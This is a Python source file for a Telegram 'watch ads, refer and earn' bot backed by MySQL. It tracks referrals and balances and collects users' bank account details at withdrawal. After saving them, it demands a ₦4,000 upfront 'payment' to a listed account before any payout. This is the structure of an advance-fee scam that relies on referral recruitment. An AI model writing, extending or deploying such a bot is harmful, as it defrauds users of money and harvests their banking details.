from telegram import Update, InlineKeyboardMarkup, InlineKeyboardButton
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    ContextTypes,
    filters,
)
from dotenv import load_dotenv
import os
import mysql.connector

# Load environment variables
load_dotenv()
BOT_TOKEN = os.getenv("BOT_TOKEN")
MYSQLPORT = int(os.getenv("MYSQLPORT", 3306))

# MySQL Connection
db = mysql.connector.connect(
    host=os.getenv("MYSQLHOST"),
    user=os.getenv("MYSQLUSER"),
    password=os.getenv("MYSQLPASSWORD"),
    database=os.getenv("MYSQLDATABASE"),
    port=MYSQLPORT
)

# Session storage
user_stage = {}
user_data = {}

# Inline Keyboard Menu
def build_menu_keyboard(referrals, balance):
    keyboard = [
        [InlineKeyboardButton("📢 Watch Ads", callback_data='watch_ads')],
        [InlineKeyboardButton("📌 Refer & Earn", callback_data='refer')],
        [InlineKeyboardButton("💰 Withdraw", callback_data='withdraw')],
        [InlineKeyboardButton(f"👥 Referrals: ({referrals})", callback_data='show_referrals')],
        [InlineKeyboardButton(f"Balance: ₦{balance}", callback_data='no_action')],
        [InlineKeyboardButton("🔄 Reload", callback_data='reload')],
    ]
    return InlineKeyboardMarkup(keyboard)

# Start Command
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user = update.effective_user
    telegram_id = user.id
    name = user.full_name
    args = context.args if update.message else []
    referrer_id = None

    if args and args[0].startswith("ref"):
        try:
            referrer_id = int(args[0][3:])
        except ValueError:
            referrer_id = None

    try:
        with db.cursor(buffered=True) as cursor:
            cursor.execute("SELECT * FROM users WHERE telegram_id = %s", (telegram_id,))
            result = cursor.fetchone()

            if not result:
                if referrer_id:
                    cursor.execute("SELECT telegram_id FROM users WHERE telegram_id = %s", (referrer_id,))
                    if not cursor.fetchone():
                        referrer_id = None

                cursor.execute(
                    "INSERT INTO users (telegram_id, name, balance, referrals, referred_by) VALUES (%s, %s, %s, %s, %s)",
                    (telegram_id, name, 0, 0, referrer_id)
                )
                db.commit()

                if referrer_id and referrer_id != telegram_id:
                    cursor.execute("UPDATE users SET referrals = referrals + 1 WHERE telegram_id = %s", (referrer_id,))
                    db.commit()

            cursor.execute("SELECT referrals, balance FROM users WHERE telegram_id = %s", (telegram_id,))
            referrals, balance = cursor.fetchone()

        markup = build_menu_keyboard(referrals, balance)

        if update.message:
            await update.message.reply_text(f"Welcome, {name}! 🎉")
            await update.message.reply_text("Choose an option:", reply_markup=markup)
        elif update.callback_query:
            await update.callback_query.message.reply_text(f"Welcome back, {name}! 🎉")
            await update.callback_query.message.reply_text("Choose an option:", reply_markup=markup)

    except mysql.connector.Error as err:
        print(f"DB Error: {err}")
        msg = "❌ Database error. Please try again later."
        if update.message:
            await update.message.reply_text(msg)
        elif update.callback_query:
            await update.callback_query.message.reply_text(msg)

# Button Actions
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    user_id = query.from_user.id

    if data == "watch_ads":
        ad_link = f"https://yourserver.com/ads?user_id={user_id}"
        await query.message.reply_text(
            "🎥 Please watch the full ad to earn ₦100.\n\n"
            f"Click below:\n{ad_link}\n\n"
            "⚠️ Do not minimize or close the video."
        )

    elif data == "refer":
        link = f"https://t.me/{context.bot.username}?start=ref{user_id}"
        await query.message.reply_text(f"🔗 Your referral link:\n{link}\n\nEarn ₦200 per referral!")

    elif data == "withdraw":
        with db.cursor(buffered=True) as cursor:
            cursor.execute("SELECT account_number, account_name, bank_name, referrals, balance FROM users WHERE telegram_id = %s", (user_id,))
            result = cursor.fetchone()
            if result:
                acc_num, acc_name, bank_name, referrals, balance = result
                if referrals < 20 or balance < 6000:
                    await query.message.reply_text("❌ You need at least 20 referrals and ₦6,000 balance to withdraw.")
                    return

        user_stage[user_id] = "account_number"
        await query.message.reply_text("💳 Enter your account number:")

    elif data == "show_referrals":
        with db.cursor(buffered=True) as cursor:
            cursor.execute("SELECT name FROM users WHERE referred_by = %s", (user_id,))
            referred = cursor.fetchall()
            if referred:
                names = "\n".join(f"• {r[0]}" for r in referred)
                await query.message.reply_text(f"👥 Your referrals:\n{names}")
            else:
                await query.message.reply_text("😕 No referrals yet.")

    elif data == "reload":
        await start(update, context)

    elif data == "no_action":
        await query.answer("Just showing your balance!")

# Handle Text Inputs
async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    stage = user_stage.get(user_id)

    if stage == "account_number":
        context.user_data["account_number"] = update.message.text
        user_stage[user_id] = "account_name"
        await update.message.reply_text("🏦 Enter your account name:")

    elif stage == "account_name":
        context.user_data["account_name"] = update.message.text
        user_stage[user_id] = "bank_name"
        await update.message.reply_text("🏛️ Enter your bank name:")

    elif stage == "bank_name":
        account_number = context.user_data.get("account_number")
        account_name = context.user_data.get("account_name")
        bank_name = update.message.text

        with db.cursor(buffered=True) as cursor:
            cursor.execute(
                "UPDATE users SET account_number = %s, account_name = %s, bank_name = %s WHERE telegram_id = %s",
                (account_number, account_name, bank_name, user_id)
            )
            db.commit()

        user_stage[user_id] = None
        context.user_data.clear()

        await update.message.reply_text("✅ Bank details saved!")

        await update.message.reply_text(
            "🧾 *Next Step: Payment Required*\n\n"
            "Send ₦4,000 to:\n"
            "*Account Name:* John Doe\n"
            "*Account Number:* 1234567890\n"
            "*Bank:* First Bank\n\n"
            "We’ll process your withdrawal within 6 hours after payment.",
            parse_mode="Markdown"
        )
        await start(update, context)

# Run Bot
def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
    print("🚀 Bot is running...")
    app.run_polling()

if __name__ == '__main__':
    main()
